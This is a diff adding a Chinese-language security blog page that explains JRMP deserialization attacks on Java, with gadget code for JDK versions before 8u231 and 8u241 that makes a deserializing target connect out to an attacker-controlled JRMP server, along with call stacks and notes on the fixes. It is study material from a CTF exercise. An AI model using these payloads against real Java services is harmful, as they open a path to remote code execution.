@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    
+
+    
+<div class="hd posts">
+
+    <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a>
+    <div class="post-title">
+        <p>
+            JRMP反序列化
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        
+        <div id="table-of-content">
+            <ul id="table-of-content-ul">
+
+            </ul>
+        </div>
+
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做题时遇到一题，打JRMP反序列化的，做了才发现先前的RMI反序列化学过，但没完全理清哈哈哈。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/14934168.html">https://www.cnblogs.com/zpchcbd/p/14934168.html</a></p>
+<p>先前说的RMI反序列化攻击，都是针对于RMI服务的（入口不是readObject，中间有readObject）。</p>
+<p>JRMP反序列化攻击，针对的是有可控反序列化点该怎么打（入口是readObject）。</p>
+<p>下面两个攻击手法，都是以readObject为入口，sink点为发送JRMP请求的攻击。根据JDK版本分了两种payload，这两种payload也分别对应RMI攻击中两种版本的绕过。</p>
+<h1 id="JDK8u231"><a href="#JDK8u231" class="headerlink" title="JDK8u231"></a>JDK8u231</h1><p>8u231之前都可以用这个。</p>
+<p>getObj填上JRMP服务器的地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static RemoteObjectInvocationHandler getInvocationHandler(String host,int port) throws  Exception&#123;</span><br><span class="line">    ObjID id = new ObjID(1); // RMI registry</span><br><span class="line">    TCPEndpoint te = new TCPEndpoint(host, port);</span><br><span class="line">    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));</span><br><span class="line">    return new RemoteObjectInvocationHandler(ref);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用栈与8u231之后的修复</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RemoteObject#readObject</span><br><span class="line">	UnicastRef#readExternal</span><br><span class="line">		LiveRef#read</span><br><span class="line">			DGCClient#registerRefs</span><br><span class="line">				DGCClient$EndpointEntry#registerRefs</span><br><span class="line">					DGCClient$EndpointEntry#makeDirtyCall</span><br><span class="line">						DGCImpl_Stub#dirty</span><br><span class="line">							// JDK8u231之后在这里添加了过滤器 StreamRemoteCall#setObjectInputFilter</span><br><span class="line">							UnicastRef#invoke</span><br><span class="line">								StreamRemoteCall#executeCall</span><br><span class="line">									//发起JRMP请求</span><br><span class="line">										readObject</span><br></pre></td></tr></table></figure>
+
+<p>其实不一定要用RemoteObjectInvocationHandler，RemoteObject的任意子类都可以，因为子类readObject时会先调用父类的readObject。</p>
+<p>比如用RegistryImpl一样可以：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line">    ObjID id = new ObjID(1); // RMI registry</span><br><span class="line">    TCPEndpoint te = new TCPEndpoint(&quot;127.0.0.1&quot;, 17777);</span><br><span class="line">    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));</span><br><span class="line">    RemoteObject registryImpl = Util.createWithoutConstructor(RegistryImpl.class);</span><br><span class="line">    Util.setFieldValue(registryImpl,&quot;ref&quot;,ref);</span><br><span class="line"></span><br><span class="line">    Util.unserialize(Util.serialize(registryImpl));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="JDK8u241"><a href="#JDK8u241" class="headerlink" title="JDK8u241"></a>JDK8u241</h1><p>8u241之前打这个。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static RemoteObjectInvocationHandler getInvocationHandler(String host,int port) throws  Exception&#123;</span><br><span class="line">    ObjID id = new ObjID(1); // RMI registry</span><br><span class="line">    TCPEndpoint te = new TCPEndpoint(host, port);</span><br><span class="line">    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));</span><br><span class="line">    return new RemoteObjectInvocationHandler(ref);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static UnicastRemoteObject getUnicastRemoteObject(String host, int port) throws  Exception&#123;</span><br><span class="line">    LiveRef liveRef = new LiveRef(new ObjID(1), new TCPEndpoint(host,port), false);</span><br><span class="line">    UnicastRef ref = new UnicastRef(liveRef);</span><br><span class="line">    RemoteObjectInvocationHandler remoteObjectInvocationHandler = getInvocationHandler(host,port);</span><br><span class="line"></span><br><span class="line">    RMIServerSocketFactory rmiServerSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(RMIServerSocketFactory.class.getClassLoader(),</span><br><span class="line">            new Class[]&#123;RMIServerSocketFactory.class, Remote.class&#125;,remoteObjectInvocationHandler</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    UnicastRemoteObject unicastRemoteObject = Util.createWithoutConstructor(UnicastRemoteObject.class);</span><br><span class="line">    Util.setFieldValue(unicastRemoteObject,&quot;ref&quot;,ref);</span><br><span class="line">    Util.setFieldValue(unicastRemoteObject,&quot;ssf&quot;,rmiServerSocketFactory);</span><br><span class="line">    return unicastRemoteObject;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用栈与8u241之后的修复</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UnicastRemoteObject#readObject</span><br><span class="line">	reexport</span><br><span class="line">		...</span><br><span class="line">			TCPTransport#listen</span><br><span class="line">				TCPEndPoint#newServerSocket</span><br><span class="line">					RemoteObjectInvocationHandler#invoke</span><br><span class="line">						RemoteObjectInvocationHandler#invokeRemoteMethod</span><br><span class="line">							//修复位置在这里，下面走不通了</span><br><span class="line">								UnicastRef#invoke</span><br><span class="line">									StreamRemoteCall#executeCall</span><br><span class="line">										//发送JRMP请求，然后对返回结果readObject</span><br></pre></td></tr></table></figure>
+
+
+
+<p>其实这个payload 8u241之前包括8u231之前的所有版本都可以打。因为UnicastRemoteObject是RemoteObject的子类，会先调用RemoteObject的readObject，调用完他再调用UnicastRemoteObject的readObject。</p>
+
+    </div>
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('img'); // 选择所有 img 元素
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+
+        var getAllHeader = ()=>{
+            var content = document.getElementsByClassName('post-content')[0].childNodes
+            // var h2 = h1.getElementsByTagName("h2")
+            var result = []
+            var pair
+            for(var node of content){   
+                var tagName = (node.tagName?node.tagName:"").toLowerCase()
+                if(tagName === 'h1'){
+                    if(pair){
+                        result.push(pair)
+                    }
+                    pair = {"h1":node,"h2":[]}
+
+                }else if(tagName === 'h2'){
+                    pair.h2.push(node)
+                }
+
+            }
+            result.push(pair)
+            return result
+        }
+
+        var writeHeader = (headers)=>{
+            var _ul = document.getElementById("table-of-content-ul")
+            for(var p of headers){ 
+                console.log(p)
+
+                var h1_li = document.createElement('li')
+                var h1_a = document.createElement('a')
+                h1_a.innerText = p.h1.innerText
+                h1_a.href = `#${p.h1.id}`
+                h1_li.appendChild(h1_a)
+                var ul = document.createElement('ul')
+                for(var h2 of p.h2){
+                    var h2_li = document.createElement('li')
+                    var h2_a = document.createElement('a')
+                    h2_a.innerText = h2.innerText
+                    h2_a.href = `#${h2.id}`
+                    h2_li.appendChild(h2_a)
+                    ul.appendChild(h2_li)
+                }
+                h1_li.appendChild(ul)
+                _ul.appendChild(h1_li)
+            }
+        }
+        var headers = getAllHeader()
+        writeHeader(headers)
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script></body>
+
+</html>
